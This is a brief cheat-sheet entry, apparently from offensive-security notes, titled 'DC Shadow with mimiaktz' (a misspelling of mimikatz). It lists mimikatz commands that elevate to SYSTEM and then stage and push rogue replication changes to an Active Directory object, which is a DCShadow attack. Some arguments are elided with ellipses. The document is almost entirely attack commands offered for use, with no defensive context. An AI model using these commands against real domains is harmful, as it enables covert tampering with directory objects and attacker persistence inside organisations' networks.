
## DC Shadow with mimiaktz

Running as SYSTEM

```powershell
privilege::debug 
token::elevate 
lsadump::dcshadow /stack /object:CN=Zoombie,DC=contoso,DC=com... 
... 
lsadump::dcshadow
```

Running as domain admin

```powershell
lsadump::dcshadow /push
```